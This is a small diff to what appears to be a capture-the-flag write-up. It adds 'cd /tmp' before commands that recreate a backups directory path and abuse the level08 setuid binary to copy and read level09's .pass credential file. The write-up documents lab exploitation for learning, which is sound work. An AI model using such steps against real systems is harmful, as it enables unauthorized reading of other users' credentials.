@@ -26,6 +26,7 @@ Since we cannot create directory in the `level08`'s home, we need to move to `/t
 By re-creating the `./backups` directory and the path of `level09`'s `.pass` in `/tmp` and trying to re-run the program we can get the flag:
 
 ```bash
+$ cd /tmp
 $ mkdir -p ./backups/home/users/level09/
 $ /home/users/level08/level08 /home/users/level09/.pass
 $ cat backups/home/users/level09/.pass 
